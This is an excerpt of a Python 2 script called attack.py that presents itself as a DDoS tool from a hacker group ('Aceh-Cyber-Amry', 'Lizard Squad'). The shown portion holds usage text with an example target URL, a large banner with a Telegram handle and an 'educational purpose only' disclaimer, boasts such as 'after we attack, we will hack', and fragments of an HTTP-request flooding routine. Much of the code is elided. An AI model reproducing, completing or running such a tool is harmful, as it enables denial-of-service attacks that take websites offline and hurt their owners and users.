...
def usage():
	...
	print ''
	print ' \033[91m Example - \033[92m python2 attack.py https://www.MrCyberXsquard.oi'
        print ''
	print '\033[97m Aceh-Cyber-Amry -\033[91mMr_cyber-X / Lizard Squad / DDOS-Attack-kill'
	print "\a"
	print('''\033[92m ---------------------------------------------------''')
print \
"""
...
#                                                             ###                                                          
 ##                                                    #####   ###                                                         
                                                    ...
                                                    /      ###/                                                            
                                            \033[92mVersion 2.2                                                                   
           \033[36mGroup : \033[0m\033[92mAceh-\033[96mCyber-\033[34mAmry 
           \033[97mTelegram : \033[0m\033[34mhttps://t.me/\033[36mMrCyberXzero                                              
               \033[95m
     +--------------------------------------------+  
     | This Tool Is For Educational Purpose Only, |  
     | I am not responsible for your actions      |  
     +--------------------------------------------+  
     | From code -    Mr_cyber-X     [Atjeh]      |  
     +--------------------------------------------+  
"""
print '\033[96m    after we attack, we will hack '
print ''
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
 			print 'Connected #/ DDos #/ Mr_cyber-X #/ Attack'
			code=500
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "The world will attack the system, through my ten fingers created by : Mr_cyber-X"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
